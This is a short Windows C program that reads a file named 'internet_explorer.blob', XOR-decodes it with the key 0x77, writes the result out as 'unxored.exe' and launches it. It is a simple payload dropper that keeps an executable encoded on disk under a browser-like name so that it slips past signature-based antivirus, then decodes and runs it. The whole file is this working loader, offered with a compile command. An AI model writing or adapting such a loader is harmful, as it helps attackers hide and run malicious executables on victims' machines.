#include <stdio.h>
#include <windows.h>

/*
    i686-w64-mingw32-gcc -o unxor2.exe unxor.c
*/

void startup(LPCSTR lpApplicationName)
{
    // additional information
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // start the program up
    CreateProcessA
    (
        lpApplicationName,   // the path
        NULL,                // Command line or argv[1]
        NULL,                // Process handle not inheritable
        NULL,                // Thread handle not inheritable
        FALSE,               // Set handle inheritance to FALSE
        CREATE_NEW_CONSOLE,  // Opens file in a separate console
        NULL,                // Use parent's environment block
        NULL,                // Use parent's starting directory 
        &si,                 // Pointer to STARTUPINFO structure
        &pi                  // Pointer to PROCESS_INFORMATION structure
    );
        // Close process and thread handles. 
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
}

int main(int argc, char *argv[]) {

    char buffer[1] = {0};

    FILE *fp = fopen("internet_explorer.blob", "rb");
    FILE *gp = fopen("unxored.exe", "wb");

    if(fp==NULL) printf("ERROR OPENING FILE\n");

    int rc;
    while((rc = fgetc(fp)) != EOF) {
        printf("%x", rc ^ 0x77);
        fputc(rc ^ 0x77, gp);
    }

    startup("unxored.exe");

    return 0;
}
